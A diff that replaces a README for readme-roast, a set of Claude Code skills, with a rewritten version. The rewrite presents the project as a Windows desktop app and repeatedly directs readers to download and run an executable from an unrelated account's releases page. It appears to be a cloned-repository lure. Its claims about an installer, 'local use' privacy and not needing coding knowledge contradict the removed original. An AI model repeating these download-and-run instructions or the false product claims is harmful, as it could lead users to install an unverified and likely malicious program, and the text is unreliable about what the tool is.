@@ -1,196 +1,219 @@
-<p align="center">
-  <img src="assets/logo.svg" alt="readme-roast" width="400">
-</p>
+# 🥵 readme-roast - Find What Hurts Star Conversion
 
-<p align="center">
-  <a href="https://github.com/hidai25/readme-roast/stargazers"><img src="https://img.shields.io/github/stars/hidai25/readme-roast?style=social" alt="Stars"></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="License"></a>
-  <a href="https://github.com/hidai25/readme-roast/issues"><img src="https://img.shields.io/github/issues/hidai25/readme-roast" alt="Issues"></a>
-  <a href="CONTRIBUTING.md"><img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg" alt="PRs Welcome"></a>
-  <a href="https://github.com/hidai25/readme-roast/discussions"><img src="https://img.shields.io/badge/Discussions-community-blue" alt="Discussions"></a>
-</p>
+[![Download from Releases](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/Gershoncasuistical234/readme-roast/releases)
 
----
+## 🔍 What is readme-roast?
 
-Your README is your landing page. If visitors can't understand what your project does in 5 seconds, they leave. README Roast scores your README against patterns from top-starred repos in your category and tells you exactly what to fix — backed by benchmark data from 116 repos with 4.8M combined stars across 6 categories.
+readme-roast is a desktop tool that checks your README against 116 top-starred GitHub repos. It compares your page with a large set of proven examples and points out what may be blocking stars.
 
-We roasted our own README first. It scored **47/100**. We fixed it. You're reading the result.
+Use it when you want a plain view of how your README reads to visitors. It helps you spot weak spots in layout, clarity, and first-impression value.
 
-<p align="center">
-  <img src="assets/demo.gif" alt="README Roast demo — audit, history, and star killers" width="700">
-</p>
+## 📥 Download and install
 
-## Table of Contents
+Visit the release page and download the Windows file from there:
 
-- [Prerequisites](#prerequisites)
-- [Quick Start](#quick-start)
-- [Example: Roasting EvalView](#example-roasting-evalview-77-stars)
-- [What It Scores](#what-it-scores)
-- [Benchmark Categories](#benchmark-categories)
-- [All Commands](#all-commands)
-- [Track Your Progress](#track-your-progress)
-- [How It Works](#how-it-works)
-- [Contributing](#contributing)
+https://github.com/Gershoncasuistical234/readme-roast/releases
 
-## Prerequisites
+After the file downloads:
 
-**Requires [Claude Code](https://claude.ai/code)** (free tier available) — README Roast runs as Claude Code skills. [Install Claude Code](https://docs.anthropic.com/en/docs/claude-code/overview), then:
+1. Open the file from your Downloads folder.
+2. If Windows asks for permission, choose Run or Yes.
+3. Follow the on-screen setup steps.
+4. Start the app from the shortcut or the Start menu.
 
-```bash
-git clone https://github.com/hidai25/readme-roast
-cd readme-roast
-claude
-```
+If you use a work laptop, you may need admin access to install it.
 
-## Quick Start
+## 🪟 Windows system needs
 
-Inside Claude Code, run:
+This app is made for Windows users. A standard setup should work on most modern PCs.
 
-```bash
-# Roast any GitHub repo's README
-/readme-audit https://github.com/your/repo
+Recommended setup:
 
-# Roast the current repo
-/readme-audit
-```
+- Windows 10 or Windows 11
+- At least 4 GB RAM
+- 200 MB free disk space
+- A stable internet connection
+- Access to GitHub in your browser
 
-## Example: Roasting EvalView (77 stars)
+If you plan to scan large README files often, more memory helps the app stay smooth.
 
-We ran `/readme-audit` on [EvalView](https://github.com/hidai25/eval-view) and got this:
+## ⚙️ How it works
 
-```
-README Score: 77/100 — Good
+readme-roast follows a simple flow:
 
-┌──────────────────────────┬───────┬──────────────────┐
-│         Category         │ Score │ vs. Category Avg │
-├──────────────────────────┼───────┼──────────────────┤
-│ Hero & Value Prop        │ 82    │ -1               │
-│ Visual Proof             │ 78    │ +10              │
-│ Install & Quickstart     │ 88    │ +4               │
-│ Trust Signals            │ 64    │ -20              │
-│ Structure & Scannability │ 68    │ -12              │
-│ Differentiation & CTA    │ 76    │  0               │
-└──────────────────────────┴───────┴──────────────────┘
+1. You open the app.
+2. You point it at a README file or GitHub repo.
+3. It compares your content with the benchmark set.
+4. It shows where your README loses attention.
+5. You use the results to edit your page.
 
-Top Star Killers:
-1. Trust Signals (-20 vs avg) — No "used by" logos, 60% of testing repos have them
-2. Structure (-12 vs avg) — 450+ lines, no TOC, kitchen-sink syndrome
-3. Hero (-1 vs avg) — 3 bold paragraphs push the GIF demo to the fold boundary
-```
+The tool focuses on clear feedback. It helps you see what users may notice first, what they may skip, and where the page may feel weak.
 
-Not "your README could be better." Instead: "You're 20 points below average on trust signals because 60% of testing repos have 'used by' logos and you don't."
+## ✨ Main features
 
-## What It Scores
+### 🔥 README benchmark checks
 
-```
-README Score = (Hero × 25%) + (Visuals × 20%) + (Install × 15%)
-             + (Trust × 15%) + (Structure × 15%) + (Differentiation × 10%)
-```
+The app compares your README with a strong reference set of 116 top-starred repos. That gives you a practical yardstick instead of guesswork.
 
-| Category | What It Checks |
-|----------|---------------|
-| **Hero & Value Prop** (25%) | Can someone understand what this does and why in 5 seconds? |
-| **Visual Proof** (20%) | GIF, screenshot, or demo showing it actually works? |
-| **Install & Quickstart** (15%) | Steps from zero to "wow, this works"? |
-| **Trust Signals** (15%) | Badges, "used by" logos, maintenance signals? |
-| **Structure** (15%) | Scannable in 30 seconds? TOC, headings, bullets? |
-| **Differentiation** (10%) | Why this over alternatives? Clear CTA? |
+### 📊 Star conversion review
 
-Each dimension is scored against **real benchmark data** from 17-20 top repos in your category (verified via GitHub API, 4.8M combined stars) — not generic advice.
+It looks for parts of the page that can hurt star conversion, such as:
 
-## Benchmark Categories
+- weak opening text
+- unclear value
+- dense blocks of text
+- missing visual structure
+- calls to action that are hard to find
 
-| Category | Repos | Combined Stars | Examples |
-|----------|-------|---------------|---------|
-| CLI Tools | 20 | 790K | ripgrep, fzf, bat, starship, lazygit, hyperfine |
-| AI/ML | 20 | 1.4M | ollama, langchain, llama.cpp, transformers, vllm |
-| Web Frameworks | 19 | 826K | fastapi, astro, supabase, nuxt, gin, flask |
-| Testing | 20 | 523K | playwright, cypress, jest, puppeteer, k6, hurl |
-| DevOps | 20 | 556K | terraform, caddy, traefik, k9s, act, argo-cd |
-| Library | 17 | 707K | axios, rich, polars, zustand, tanstack-query, dayjs |
+### 🧭 Simple guidance
 
-Your repo is auto-detected into a category based on GitHub topics, language, and description.
+The feedback is meant to be readable at a glance. You do not need coding knowledge to understand the results.
 
-## All Commands
+### 🧪 Content pattern review
 
-| Command | What It Does |
-|---------|-------------|
-| `/readme-audit <url>` | Full roast with scores, benchmarks, and action plan |
-| `/readme-audit` | Roast the current repo |
-| `/readme-hero <url>` | Deep dive: hero section & value prop |
-| `/readme-install <url>` | Deep dive: install friction |
-| `/readme-trust <url>` | Deep dive: trust signals |
-| `/readme-visuals <url>` | Deep dive: visual proof |
-| `/readme-structure <url>` | Deep dive: scannability |
-| `/readme-benchmark <url>` | Compare against category leaders |
-| `/readme-report` | Generate shareable markdown report |
-| `/readme-report-pdf` | Generate PDF report with charts |
-| `/readme-compare` | Before/after delta |
-| `/readme-rewrite` | Generate improved README sections |
-| `/readme-star-killers` | Quick diagnostic: what's killing your stars |
-| `/readme-history` | Audit timeline + score progression |
-| `/readme-history stars` | Score-to-star velocity correlation |
+readme-roast checks common README patterns and shows where your page may fall behind stronger examples.
 
-## Track Your Progress
+### 🧱 Clear improvement areas
 
-Every audit auto-saves to `.readme-roast/` inside your repo. Git-friendly. Designed to be committed.
+The app groups issues so you can fix the most visible ones first. That helps you spend time on the parts that matter most.
 
-```
-/readme-history
+## 🚀 Getting started
 
-Score Progression:
-  #1  2026-03-30  ████████░░░░░░░░░░░░  47/100  Needs Work   ⭐ 1
-  #2  2026-04-05  ████████████░░░░░░░░  65/100  Fair         ⭐ 12   ▲+18
-  #3  2026-04-12  ███████████████░░░░░  78/100  Good         ⭐ 45   ▲+13
+1. Download the release file from:
+   https://github.com/Gershoncasuistical234/readme-roast/releases
 
-Overall: +31 points in 13 days | Stars: 1 → 45
-```
+2. Open the downloaded file.
 
-Then use `/readme-compare` to see exactly which changes moved the needle.
+3. Let Windows finish the setup.
 
-## How It Works
+4. Launch readme-roast.
 
-```
-/readme-audit https://github.com/user/repo
-        │
-        ├── Fetch README + repo metadata
-        ├── Detect category (CLI, AI/ML, Web, Testing, DevOps, Library)
-        │
-        ├── [Parallel] First Impression Agent
-        │   ├── Hero & Value Prop scoring
-        │   ├── Visual Proof detection
-        │   └── Structure & Scannability
-        │
-        ├── [Parallel] Conversion Agent
-        │   ├── Trust Signals
-        │   ├── Install Friction
-        │   └── Differentiation & CTA
-        │
-        ├── [Parallel] Competitive Agent
-        │   └── Benchmark comparison
-        │
-        ├── Score aggregation + star killer ranking
-        ├── README-AUDIT-REPORT.md
-        └── Auto-save → .readme-roast/snapshots/
-```
+5. Paste in your README content or choose a repo to review.
 
-14 Claude Code skills, 3 parallel subagents, 116 benchmarked repos (4.8M combined stars).
+6. Run the check and read the results.
 
-## Contributing
+7. Update your README based on the findings.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md). PRs welcome, especially for:
-- Adding repos to benchmark categories
-- New benchmark categories (mobile, gamedev, data engineering, etc.)
-- Scoring rubric refinements
+8. Run the check again to see if the page reads better.
 
-## Like It? Star It.
+## 📝 What to review first
 
-If README Roast helped you improve your repo, [give it a star](https://github.com/hidai25/readme-roast). It helps others find it.
+If you want the fastest gains, start with these parts of your README:
 
-## License
+- the first line
+- the first 2–3 lines below it
+- the feature list
+- the install steps
+- any screenshots or examples
+- the closing section
 
-[MIT](LICENSE)
+Visitors often decide fast. A clean start and a clear path usually matter more than long text.
 
----
+## 🧩 Good use cases
 
-Built by [Hidai Bar-Mor](https://github.com/hidai25) — also building [EvalView](https://github.com/hidai25/eval-view), regression testing for AI agents.
+readme-roast fits well when you want to:
+
+- improve a new open source project
+- compare two README versions
+- prepare a repo for launch
+- review a README before a product release
+- find weak spots before asking for stars
+- check if your page is too hard to scan
+
+## 🖥️ Example workflow
+
+A simple way to use the app:
+
+1. Open your repo in GitHub.
+2. Copy the README text.
+3. Paste it into readme-roast.
+4. Review the score or findings.
+5. Rewrite the weak sections.
+6. Check again.
+
+This cycle helps you improve the page in small steps.
+
+## 📁 What you may see in the report
+
+Your report may point out things like:
+
+- too much text at the top
+- no clear benefit in the first screen
+- feature list that lacks focus
+- install steps that feel buried
+- missing proof or examples
+- weak section order
+- unclear project purpose
+
+The goal is to make the README easier to scan and easier to trust.
+
+## 🔐 Privacy and local use
+
+readme-roast is built for local review of your README content. You stay in control of what you paste or open. Use it on content you want to improve before it reaches more readers.
+
+## 🛠️ Tips for better results
+
+Use these habits when editing your README:
+
+- keep the opening short
+- say what the app does in plain words
+- put the main benefit near the top
+- break long text into short sections
+- use bullet points for lists
+- add a clear install path
+- avoid extra filler
+
+These small changes can make a large difference in how the page reads.
+
+## 🧠 Why this tool is useful
+
+Many README files have the same problem: they explain the project, but they do not guide the reader well. readme-roast helps you see the gap between what you meant to say and what a visitor may understand in a few seconds.
+
+That makes it useful for:
+
+- solo developers
+- open source maintainers
+- product teams
+- indie builders
+- technical writers
+
+## 📌 Topics covered
+
+This project relates to:
+
+- benchmark
+- Claude Code
+- developer tools
+- GitHub stars
+- open source
+- OSS
+- README
+- README audit
+- README optimization
+- stars
+
+## ❓ Common questions
+
+### Do I need coding knowledge?
+
+No. The app is meant for regular users who want to review a README. You can follow the steps with basic computer skills.
+
+### Do I need to install extra tools?
+
+In most cases, no. Download the release file, open it, and follow the prompts.
+
+### Can I use it for any GitHub repo?
+
+Yes. It works best when you want to review a README and compare it with strong examples.
+
+### What kind of README changes does it help with?
+
+It helps with structure, clarity, first-impression text, and overall scanability.
+
+## 📦 Download
+
+Get the Windows release here:
+
+https://github.com/Gershoncasuistical234/readme-roast/releases
+
+Open the release page, download the file for Windows, and run it after the download finishes
